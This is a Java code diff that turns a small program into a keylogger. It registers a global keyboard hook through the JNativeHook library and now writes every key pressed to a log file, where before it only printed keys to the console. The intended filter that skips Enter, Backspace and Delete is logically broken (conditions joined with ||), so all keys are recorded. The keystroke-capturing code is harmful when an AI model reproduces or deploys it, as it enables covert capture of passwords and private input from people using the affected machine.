@@ -10,31 +10,29 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
-import jdk.nashorn.internal.objects.NativeString;
 
 public class MainKey implements NativeKeyListener {
-	private String cadena;
-	private String aux;
+	private String aux = "";
 	private log keylog = new log();
 
 	public static void main(String[] args) {
 		
-		try {
-			GlobalScreen.registerNativeHook();
-		} catch (NativeHookException e) {
+			try {
+				GlobalScreen.registerNativeHook();
+			} catch (NativeHookException e) {
 			
-			e.printStackTrace();
-		}
+				e.printStackTrace();
+			}
+				GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
 		
-		GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
-		
-	}
-
+}
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		aux = NativeKeyEvent.getKeyText(e.getKeyCode());
-		System.out.println(aux);
-		//if (!aux.equals("Intro") || !aux.equals("Retroceso") || !aux.equals("") )
+		if (!aux.equals("Intro") || !aux.equals("Retroceso") || !aux.equals("Suprimir")){			
+//System.out.print(aux);
+			keylog.escribir(aux);
+		}
 	}
 
 	@Override
@@ -48,6 +46,8 @@ public class MainKey implements NativeKeyListener {
 		
 		
 	}
+
+	
 
 }
 class log{
